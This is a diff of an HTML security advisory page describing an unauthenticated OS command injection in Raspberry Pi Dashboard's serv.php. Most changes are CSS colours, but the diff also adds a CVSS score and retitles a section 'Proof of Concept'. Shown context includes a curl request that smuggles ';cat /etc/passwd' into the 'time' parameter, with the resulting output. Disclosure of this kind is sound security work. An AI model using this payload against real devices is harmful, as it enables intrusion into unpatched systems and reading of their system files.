@@ -31,7 +31,7 @@
             gap: 1.5em;
         }
         #menu a {
-            color: #00ff00;
+            color: #4af626;
             font-weight: bold;
             border-bottom: 2px solid;
             transition: border-color 0.2s;
@@ -43,10 +43,10 @@
         }
         .meta-table td {
             padding: 0.4em 0.8em;
-            border: 1px solid #33FF33;
+            border: 1px solid #4af626;
         }
         .meta-table td:first-child {
-            color: #00FF00;
+            color: #4af626;
             font-weight: bold;
             white-space: nowrap;
             width: 1%;
@@ -58,19 +58,19 @@
         .back-link {
             display: inline-block;
             margin-bottom: 2em;
-            color: #00FF00;
+            color: #4af626;
             font-weight: bold;
         }
-        pre code.hljs { background: #001a00; padding: 0; }
+        pre code.hljs { background: #161b22; padding: 0; }
         pre {
-            background-color: #001a00;
-            border: 1px solid #33FF33;
+            background-color: #161b22;
+            border: 1px solid #4af626;
             padding: 1em;
             overflow-x: auto;
             line-height: 1.4;
         }
         .post-date {
-            color: #33FF33;
+            color: #4af626;
             font-size: 0.9em;
             margin-bottom: 0.5em;
         }
@@ -88,17 +88,18 @@
     </header>
 
     <main>
-        <a href="/publications.html" class="back-link">&lt;-- Back to Publications</a>
 
         <p class="post-date">12/06/2026 &mdash; Security Advisory</p>
         <h2>CVE-XXXX-XXXXX &mdash; OS Command Injection / RCE in Raspberry Pi Dashboard</h2>
 
         <table class="meta-table">
-            <tr><td>Product</td><td>Raspberry Pi Dashboard</td></tr>
+            <tr><td>Product</td><td><a href="https://github.com/femto-code/Raspberry-Pi-Dashboard">Raspberry Pi Dashboard</a></td></tr>
             <tr><td>Version</td><td>v0.1 &ndash; v1.1.6 (all releases)</td></tr>
             <tr><td>File</td><td><code>backend/serv.php</code> (lines 76&ndash;93)</td></tr>
             <tr><td>CVE</td><td>CVE-XXXX-XXXXX (pending)</td></tr>
             <tr><td>CWE</td><td>CWE-78 &mdash; Improper Neutralization of Special Elements used in an OS Command</td></tr>
+            <tr><td>CVSS 3.1 Vector</td><td>AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</td></tr>
+            <tr><td>CVSS Score</td><td><span class="severity-critical">9.8 (Critical)</span></td></tr>
             <tr><td>Auth Required</td><td>No (default state) / Yes (if password configured)</td></tr>
             <tr><td>Discovered by</td><td>Lennart Hostettler</td></tr>
         </table>
@@ -127,9 +128,9 @@ if(isset($_REQUEST["p"])){
             and backticks are never filtered, allowing injection regardless of the prefix logic.
         </p>
 
-        <h2>Authentication</h2>
+        <h2>Proof of Concept</h2>
 
-        <h4>&gt; Default state (no password set)</h4>
+        <h4>&gt; Step 1 &mdash; Unauthenticated (default state, no password set)</h4>
         <p>
             If no password has been configured during setup, the vulnerability is fully unauthenticated:
         </p>
@@ -140,7 +141,7 @@ daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
 ...</code></pre>
 
-        <h4>&gt; Setup completed (custom password configured)</h4>
+        <h4>&gt; Step 2 &mdash; Authenticated (custom password configured)</h4>
         <pre><code class="language-bash">curl -v "http://&lt;host&gt;/backend/serv.php?p=&lt;password&gt;&a=2&time=lennart1337;cat+/etc/passwd"
 
 root:x:0:0:root:/root:/bin/bash
